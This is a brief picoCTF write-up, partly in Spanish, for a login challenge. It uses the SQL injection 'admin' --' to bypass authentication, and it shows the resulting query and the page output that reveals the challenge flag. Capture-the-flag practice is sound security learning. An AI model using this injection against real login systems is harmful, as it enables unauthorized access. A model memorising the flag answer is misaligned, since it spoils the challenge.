
## Descripción :
	Can you login to this website?Try to login [here](http://saturn.picoctf.net:61806/).
## Solución :
usando en el loggin la inyección admin' -- e inspeccionar el  código encontramos la flag 
```
|   |   |
|---|---|
||<pre>username: admin&#039; --|
||password:|
||SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; --&#039; AND password=&#039;&#039;|
||</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>|
```

	picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
